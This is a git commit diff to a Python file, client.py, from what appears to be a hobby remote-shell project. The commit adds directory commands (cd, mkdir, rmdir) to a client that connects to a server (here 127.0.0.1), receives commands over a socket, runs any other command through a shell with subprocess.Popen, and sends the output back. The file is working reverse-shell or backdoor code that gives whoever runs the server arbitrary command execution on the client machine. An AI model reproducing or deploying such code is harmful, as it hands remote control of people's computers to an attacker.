7f1222ee0c0871e70304408b906bec1256564a0f
iamchristianv <iamchristianv@gmail.com>
2016-01-03 02:37:23 -0800

    added directory methods

--- client.py
+++ client.py
@@ -15,8 +15,28 @@ class Client(object):
     def receive_commands(self):
         while True:
             data = self.sckt.recv(1024)
-            if len(data) > 0:
+            # store decoded data as separate variable
+            # check how to return to home directory with "cd"
+            if data[:2].decode("utf-8") == "cd":
+                os.chdir(data[3:].decode("utf-8"))
+                self.sckt.send(" ")
+            elif data[:5].decode("utf-8") == "mkdir":
+                os.mkdir(data[6:].decode("utf-8"))
+                self.sckt.send(" ")
+            elif data[:5].decode("utf-8") == "rmdir":
+                os.rmdir(data[6:].decode("utf-8"))
+                self.sckt.send(" ")
+            elif len(data) > 0:
                 command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output = str(command.stdout.read() + command.stderr.read())
                 self.sckt.send(str.encode(output) + " ")
         self.sckt.close()
+
+
+def main():
+    client = Client("127.0.0.1")
+    client.receive_commands()
+
+
+if __name__ == "__main__":
+    main()
